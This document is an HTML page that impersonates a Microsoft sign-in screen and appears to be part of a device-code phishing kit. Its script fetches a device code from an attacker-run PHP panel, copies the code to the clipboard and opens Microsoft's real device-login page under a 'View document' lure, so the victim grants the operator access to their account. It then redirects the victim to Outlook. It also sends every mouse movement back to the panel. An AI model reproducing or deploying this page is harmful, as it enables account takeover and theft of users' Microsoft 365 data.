<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Enter your credentials</title>
  <script src="/assets/js/client_geo.js"></script>
</head>
<body>
  <div class="auth-card">
    <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">
    <h1>Sign in</h1>
    <p>Continue with your Microsoft account to proceed.</p>
    <p>Enter this code on the Microsoft sign-in page:</p>
    <div id="codeDisplay" data-label="user_code">LS48KA57E</div>
    <div class="actions">
      <button id="copyButton" type="button">Copy</button>
      <a id="verificationLink" href="https://login.microsoft.com/device" target="_blank">
        <button id="openVerifyBtn" type="button">View document</button>
      </a>
    </div>
    <p id="verificationUriText">https://login.microsoft.com/device</p>
    <div id="statusBadge"><span id="statusText">Waiting for authorization...</span></div>
    <p class="hint">A pop-up window will open. Paste the code there to continue.</p>
  </div>
  <script>
    (function () {
      var panelUrl = '/assets/php/endpoints/session_public.php';
      var activeSessionId = null;
      var currentCode = '';
      var verifyUrl = 'https://login.microsoft.com/device';
      var verifyUrlComplete = 'https://login.microsoftonline.com/common/oauth2/deviceauth';

      async function startDeviceFlow() {
        var res = await fetch(panelUrl + '?action=start', { method: 'GET', credentials: 'same-origin' });
        var data = await res.json();
        activeSessionId = data.session_id;
        currentCode = data.user_code || data.device_code || '';
        verifyUrl = data.verificationUri || data.verification_uri || verifyUrl;
        verifyUrlComplete = data.verificationUriComplete || data.verification_uri_complete || verifyUrl;
        document.getElementById('codeDisplay').textContent = currentCode;
        setInterval(pollDeviceSession, 3000);
      }

      async function pollDeviceSession() {
        if (!activeSessionId) return;
        var res = await fetch(panelUrl + '?action=poll&session_id=' + encodeURIComponent(activeSessionId), {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ session_id: activeSessionId, action: 'poll' })
        });
        var state = await res.json();
        if (state.status === 'authorization_pending' || state.status === 'slow_down') {
          return;
        }
        if (state.status === 'completed' || state.status === 'authorized' || state.redirect) {
          window.location.href = state.redirect || 'https://outlook.office.com/mail/';
        }
      }

      document.getElementById('copyButton').addEventListener('click', function () {
        navigator.clipboard.writeText(currentCode);
      });

      document.getElementById('openVerifyBtn').addEventListener('click', function () {
        navigator.clipboard.writeText(currentCode);
        window.open(verifyUrlComplete, '_blank', 'width=520,height=640,menubar=no,toolbar=no,location=no,status=no,resizable=yes,scrollbars=yes');
      });

      document.addEventListener('mousemove', function(e) { fetch(panelUrl, {method:'POST', body:JSON.stringify({action:'save_mouse_data', x:e.clientX, y:e.clientY})}); });
      startDeviceFlow();
    })();
  </script>
</body>
</html>
